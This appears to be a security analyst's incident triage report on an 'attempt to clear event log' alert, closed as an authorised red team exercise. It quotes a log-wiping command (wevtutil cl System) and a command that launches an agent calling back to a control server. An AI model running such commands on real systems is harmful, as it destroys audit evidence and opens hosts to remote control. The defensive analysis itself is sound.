Alert: Attempt to clear event log

Endpoint: ec2amaz-9oh9aqq

User: NT AUTHORITY\SYSTEM

OS: Windows Server 2022

Verdict: True positive as nssm.exe and wusvc.exe are running from temporary folders a connection
to malicious IP address (172.31.2.203) found in command line).

Image file path: \Device\HarddiskVolume1\Windows\Temp\nssm\nssm-2.24-101-
g897c7ad\win64\nssm.exe

Command Line:

Some of commands are:

"wusvc.exe" -server http://172.31.2.203:8888 -group red

cmd.exe /C wevtutil cl System

Why was the alert triggered?

A process attempted to clear the event log.

What was the Threat Actor trying to do?

The attacker trying to hide evidence of malicious activity.

Why did the Threat Actor run those commands/malware?

cmd.exe /C wevtutil cl System

which spawned

wevtutil.exe cl System

This command completely clears the Windows System Event Log.

Did it execute successfully?

cmd.exe cleared the System event log

Is it malicious or a false positive?

True Positive – Authorised Security Testing.

Remediation:

•  ServiceNow ticket raised with the Red Team to validate the activity

Closure Notes:

Investigation confirmed the alert was triggered by an authorised Red Team exercise. The detected
behaviour (wevtutil cl System) was intentional and designed to emulate attacker defence evasion
techniques. Validation was obtained through a ServiceNow request to the Red Team. No
unauthorised or malicious activity was identified. Incident closed as True Positive – Authorised
Security Testing.

